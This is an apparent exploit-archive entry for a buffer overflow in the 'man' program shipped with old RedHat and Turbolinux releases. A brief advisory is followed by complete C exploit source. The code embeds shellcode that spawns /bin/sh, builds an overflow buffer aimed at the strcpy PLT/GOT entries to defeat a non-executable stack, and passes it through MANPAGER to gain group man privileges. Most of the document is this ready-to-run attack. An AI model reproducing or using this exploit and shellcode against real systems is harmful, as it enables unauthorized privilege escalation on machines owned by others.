RedHat 4.0/4.1/4.2/5.0/5.1/5.2/6.0/6.2,RedHat man 1.5,Turbolinux man 1.5,Turbolinux 3.5/4.2/4.4 man Buffer Overrun Vulnerability
 
source: http://www.securityfocus.com/bid/1011/info
 
A buffer overflow exists in the implementation of the 'man' program shipped with RedHat Linux, and other LInux vendors. By carefully crafting a long buffer of machine executable code, and placing it in the MANPAGER environmental variable, it becomes possible for a would be attacker to gain egid man.
 
Using attacks previously outlined by Pawel Wilk, and available in the reference portion of the credit section, it is possible for an attacker to alter manpages such that code will be executed. Upon looking up an altered manpage, code will be executed with the privileges of the person running man. If this person is the root user, root privileges can be obtained.

/*
 * Rewriten from:
 * (c) 2000 babcia padlina / b0f
 * (lcamtuf's idea)
 * by Kil3r of Lam3rZ
 * for nonexec stack environment
 * 
 * redhat 6.1 (and others) /usr/bin/man exploit
*/

        char execshell[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";


#include <stdio.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <string.h>

#define STRCPY          0x80490e4       // <== strcpy() PLT entry
#define GOT             0x805038c       // <== strcpy() GOT entry
#define NOP             0x90
#define BUFSIZE         4033+38
#define RET             STRCPY          //0x46464646
#define _BIN_SH         0xbfffffe7      // <== where we have "/bin/sh" string,
                                        //    curently useless ;)
#define SHELLCODE       0xbfffffc1

long getesp(void)
{
   __asm__("movl %esp, %eax\n");
}

int main(argc, argv)
int argc;
char **argv;
{
        char buf[BUFSIZE], *p;
        char *env[3];
        int *ap;

        memset(buf,NOP,BUFSIZE);

        p=buf+BUFSIZE-4;
        ap=(int *)p;
        *ap++ =RET;
        *ap++ =GOT+4;
        *ap++ =GOT+4;
        *ap++ =SHELLCODE;

        fprintf(stderr, "RET: 0x%x  SHELLCODE: 0x%x", RET, SHELLCODE);

        memcpy(buf,"MANPAGER=", 9);
        env[0]=buf;
//      env[1]="/bin/sh";
        env[1]=execshell;
        env[2]=(char *)0;
        execle("/usr/bin/man", "man", "ls", 0, env); // use execle to have
                                // shellcode and other params at fixed addr!!!

        return 0;
}